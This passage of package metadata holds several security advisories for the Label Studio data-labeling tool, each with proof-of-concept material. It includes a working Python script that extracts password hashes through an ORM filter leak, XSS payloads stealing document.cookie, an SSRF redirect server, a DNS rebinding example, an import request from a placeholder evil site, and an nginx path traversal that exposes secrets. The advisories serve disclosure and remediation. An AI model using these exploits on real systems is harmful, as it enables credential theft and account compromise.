'{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"0.8.0":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: MIT License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/0.8.0/","requires_dist":["pip (>=20.2.3)","appdirs (==1.4.3)","attrs (==19.1.0)","blis (==0.4.1)","certifi (==2019.11.28)","chardet (==3.0.4)","Click (==7.0)","cymem (==2.0.3)","Flask (==1.1.1)","idna (==2.8)","itsdangerous (==1.1.0)","Jinja2 (==2.10.3)","lxml (>=4.2.5)","MarkupSafe (==1.1.1)","mixpanel (==4.4.0)","numpy (==1.17.4)","python-dateutil (==2.8.1)","pytz (==2019.3)","requests (==2.22.0)","six (>=1.13.0)","srsly (>=0.2.0)","tqdm (==4.40.2)","urllib3 (==1.25.7)","wasabi (==0.4.2)","Werkzeug (==0.16.0)","ordered-set (==4.0.2)","orjson (>=2.0.11)","rarfile (==3.1)","flask-api (>=2.0)","pandas (>=0.24.0)","jsonschema (>=3.2.0)","xmljson (==0.2.0)","rq (>=1.0)","boto3 (>=1.12.32)","google-cloud-storage (==1.28.1)","flask-wtf (==0.14.3)","label-studio-converter (>=0.0.19)","htmlmin (==0.1.12)","gevent (>=20.6.2)","ujson (==3.0.0)"],"requires_python":">=3.5","summary":"Label Studio annotation tool","version":"0.8.0","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"f2c9279972618644c5eeba62cf9859dfb7a2eadb1c354964b99bffc2d6d1fc57","md5":"d10c0e8c1a0216102da0f6eec514446e","sha256":"27deda69eb1794d3b49615081ca05c61a4dc3a373bab026c877500fe21245cf3"},"downloads":-1,"filename":"label_studio-0.8.0-py3-none-any.whl","has_sig":false,"md5_digest":"d10c0e8c1a0216102da0f6eec514446e","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.5","size":12377323,"upload_time":"2020-10-27T09:52:29","upload_time_iso_8601":"2020-10-27T09:52:29.456107Z","url":"https://files.pythonhosted.org/packages/f2/c9/279972618644c5eeba62cf9859dfb7a2eadb1c354964b99bffc2d6d1fc57/label_studio-0.8.0-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"085e6f7812b00a2ba8f91423a6c5be71ea0b06e19104f275bda4bf59d5a0145a","md5":"2138fc37680ec5d5dd03db7a6f4fbc74","sha256":"7b1fbb479365e0780738fbcfdd147a054646d75294b080bb047854cfb149a3d7"},"downloads":-1,"filename":"label-studio-0.8.0.tar.gz","has_sig":false,"md5_digest":"2138fc37680ec5d5dd03db7a6f4fbc74","packagetype":"sdist","python_version":"source","requires_python":">=3.5","size":12276848,"upload_time":"2020-10-27T09:52:36","upload_time_iso_8601":"2020-10-27T09:52:36.555421Z","url":"https://files.pythonhosted.org/packages/08/5e/6f7812b00a2ba8f91423a6c5be71ea0b06e19104f275bda4bf59d5a0145a/label-studio-0.8.0.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, 